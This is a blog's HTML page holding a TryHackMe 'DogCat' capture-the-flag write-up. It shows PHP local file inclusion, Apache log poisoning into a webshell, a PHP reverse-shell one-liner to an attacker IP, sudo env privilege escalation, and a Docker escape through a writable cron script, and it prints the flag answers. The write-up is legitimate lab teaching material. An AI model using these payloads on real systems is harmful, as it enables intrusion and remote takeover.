<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="icon" type="image/png" href="/favicon.png">
  <link rel="stylesheet" type="text/css" href="/css/style.css">
  <link rel="preconnect" href="https://fonts.gstatic.com"> 
  <link
  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&display=swap"
  rel="stylesheet"> 
  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
  <script src="/dist/mark.min.js" charset="UTF-8"></script>
<title>TryHackMe - DogCat Writeup &mdash; fmash16's blog</title>
<meta property="og:title" content="TryHackMe - DogCat Writeup" />
      <meta property="og:description" content="topics" />
      <meta property="og:type" content="article" />
      <meta property="og:url" content="github" />
      <meta property="og:image" content="https://fmash16.github.io/img/tryhackme_dogcat/card.png" />

</head>

<body>
  <!-- Side navigation -->
    <div class="sidebar">
    <div class="vertical-center">
      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
      <p style="text-align:center">
      <b style="font-family: 'Electrolize',sans-serif;font-size:1.7em;text-align:center;">fmash16</b><br/>
      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
      <p style="text-align:center;font-size:20px">
        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a>
        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a>
        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
      </p>
    </div>
    </div>

<!-- <nav class="menu"> -->
<!-- <div class="nav-left"> -->
<!--  <ul> -->
<!--     <li><a href="index.html"><img class="logo" src="favicon.png" alt="">fmash16's blog</a></li> -->
<!--   </ul> -->
<!-- </div> -->
<!-- <div class="nav-right"> -->
<!--  <ul> -->
<!--     <li><a href="mailto:fmash16@gmail.com">contact</a></li> -->
<!--     <li><a href="https://github.com/fmash16">github</a></li> -->
<!--     <li><a href="https://twitter.com/fmash16">twitter</a></li> -->
<!--   </ul> -->
<!-- </div> -->
<!-- </nav> -->

<article>
<h1 id="tryhackme---dogcat-writeup">TryHackMe - DogCat Writeup</h1>
<h2 id="nmap-scan">## Nmap scan</h2>
<pre class="shell:#"><code>nmap -sC -sV -oN nmap.out 10.10.174.171</code></pre>
<p>Open ports: * 22 - SSH * 80- http</p>
<p>We have a look at the webpage where it lets us view some dot or cat pictures</p>
<p><img src="/img/tryhackme_dogcat/1.png" /></p>
<p>Having a look at the url, we see that the page is running a php that shows the pictures stored in the dogs/ or cats/ folder which passes the value “dog” or “cat” to the variable “view”.</p>
<p>We try some basic LFI here to chech if we can view the /etc/passwd for example with the req url as:</p>
<pre class="http://10.10.174.171/?view=../../../../../../../etc/passwd```"><code>
But it fails showing that only dogs or cats are allowed.

![](/img/tryhackme_dogcat/2.png)

So it checks for a string dog or cat in the provided value of view. We try
adding &quot;dog&quot; after a null byte %00 so that it passes the string check but is
not evaluated when showing the file. We get the following:

![](/img/tryhackme_dogcat/3.png)

We see that we do bypass the string check but it fails to open a the file.

Accidentally passing dogs to the view variable, we find that the script also
adds the extension .php to the end of the file to be viewed passed in the view
variable

![](/img/tryhackme_dogcat/4.png)

## Local File Inclusion
---
Googling a bit, we find a new php LFI technique found [here](https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/). 

I originally found it in [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) which is a great source for pentesters.

We use the technique to get our base64 encoded php source of dog.php and decode
it to view the source.

```http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog```

![](/img/tryhackme_dogcat/5.png)

![](/img/tryhackme_dogcat/6.png)

Now we see that we can also check the source of the index.php file using
directroy traversal in the same way

```http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index```

```index.php
&lt;!DOCCTYPE HTML&gt;
&lt;html&gt;

&lt;head&gt;
    &lt;title&gt;dogcat&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/style.css&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;h1&gt;dogcat&lt;/h1&gt;
    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;

    &lt;div&gt;
        &lt;h2&gt;What would you like to see?&lt;/h2&gt;
        &lt;a href=&quot;/?view=dog&quot;&gt;&lt;button id=&quot;dog&quot;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a
href=&quot;/?view=cat&quot;&gt;&lt;button id=&quot;cat&quot;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
        &lt;?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#39;.php&#39;;
            if(isset($_GET[&#39;view&#39;])) {
                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) ||
containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {
                    echo &#39;Here you go!&#39;;
                    include $_GET[&#39;view&#39;] . $ext;
                } else {
                    echo &#39;Sorry, only dogs or cats are allowed.&#39;;
                }
            }
        ?&gt;
    &lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;</code></pre>
<p>What’s interesting here is that it allows us to pass an “ext” variable that contains the file extension. On the variable being unset, it adds the default extension of .php</p>
<p>So we check now if we can read the /etc/passwd file with the following request</p>
<pre class="http://10.10.174.171/?view=dog/../../../../etc/passwd&amp;ext=```"><code>
And we see that we can!

![](/img/tryhackme_dogcat/7.png)


Now we check if we can find the log file where it logs all our requests. After
fiddling around for a bit, we find the logs in the /var/log/apache2/access.log
finding out that the server is running apache2. And we see our last request
there.

![](/img/tryhackme_dogcat/8.png)

We see that the log also saves our user-agent header, in our case, Mozilla
Firefox

So, we check if we can inject some php code into our user-agent header that will
also get executed along with the main php file.

We can do this using burpsuite repeater to test again and again.

We change the header to hello to test and it works

![](/img/tryhackme_dogcat/9.png)

Now we test some php commands. First we try the system(&quot;&lt;cmd&gt;&quot;) which is
suposed to execute the command on the machine and print us the output
```&lt;?php system(&quot;ls&quot;)?&gt;```

But executing this once, we somehow break the machine and cannot access the log
any more
![](/img/tryhackme_dogcat/10.png)

Next we try a webshell like approach that will get a command passed in the
cmd variable and execute it.
```system($_GET[&#39;cmd&#39;]);```

![](/img/tryhackme_dogcat/11.png)

And we have command execution!


## User www-data
---
We try some commands and see that we are www-data, we try getting a reverse
shell using php. The php reverse shell:
```php -r &#39;$sock=fsockopen(&quot;10.8.6.75&quot;, 8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;```

We must url encode the revshell passed in the command. The url encoded request
stands:
```10.10.12.161/?view=dog/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=php -r &#39;$sock=fsockopen(&quot;10.8.6.75&quot;,1337);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;```

We start a nc listener on port 1337 and get the reverse shell.

![](/img/tryhackme_dogcat/12.png)

## flag1
---

Right away, we find the flag.php in the current folder. We cat out the contents
to get the flag.

![](/img/tryhackme_dogcat/13.png)

**flag1=&quot;THM{Th1s_1s_N0t_4_Catdog_ab67edfa}&quot;**

##flag2
---

After digging around the files for a bit, we find our second flag in the
/var/www directory.

![](/img/tryhackme_dogcat/14.png)

**flag2 = THM{LF1_t0_RC3_aec3fb}**

## Privilege escalation - Root
---

Next, we try to escalate our privilege to root. We try some enumeration and
find that our user can execute /usr/bin/env as sudo using the command ```sudo
-l```

![](/img/tryhackme_dogcat/15.png)

We look for privesc using env in [gtfobins](https://gtfobins.github.io/gtfobins/env/#shell)

We find that a simple ```env /bin/sh``` gives us the shell. So we try that.

![](/img/tryhackme_dogcat/16.png)

## flag3
---

And, we have escalated to root successfully. lets look for the remaining
flags.We find our 3rd flag in the /root directory.

![](/img/tryhackme_dogcat/17.png)

**flag3 = &quot;THM{D1ff3r3nt_3nv1ronments_874112}&quot;**

The flag tells us something about a different environment. 

Looking around for a bit, we find a .dockerenv file in the root directory,
which tells us that we are running inside a docker container.

![](/img/tryhackme_dogcat/18.png)

After some looking around, we find an interesting folder in the /opt/backups 
directory, having a look at the backup.sh file, we find the following

```backup.sh
tar cf /root/container/backup/backup.tar /root/container</code></pre>
<h2 id="getting-out-of-container">## Getting out of container</h2>
<p>So the script basically backs up the /root/container to the backup.tar file we found. It might be running a cron job. We see that we have write permissions to the file and so, lets try writing a reverse shell into the backup.sh file.</p>
<p><img src="/img/tryhackme_dogcat/19.png" /></p>
<p>We open up a netcat listener on port 8888 and after some time, get a shell back from root.</p>
<p><img src="/img/tryhackme_dogcat/20.png" /></p>
<h2 id="flag4">## flag4</h2>
<p>This time, we see that we are on the machine iteself and not inside a docker container. Going into the root home, /root, we fine our flag4:</p>
<p><img src="/img/tryhackme_dogcat/21.png" /></p>
<p><strong>flag4 = “THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}”</strong></p>
<p>New topics learnt: * Chech the logs * docker container, cronjob * New php lfi technique</p>
</article>

<footer>
  <p> Generated with a modified version of <a href="https://github.com/fmash16/ssg5">ssg5</a> By fmash16 <br /> 
  <i class="far fa-copyright"></i> 2020-2020 </p>
</footer>
</body>
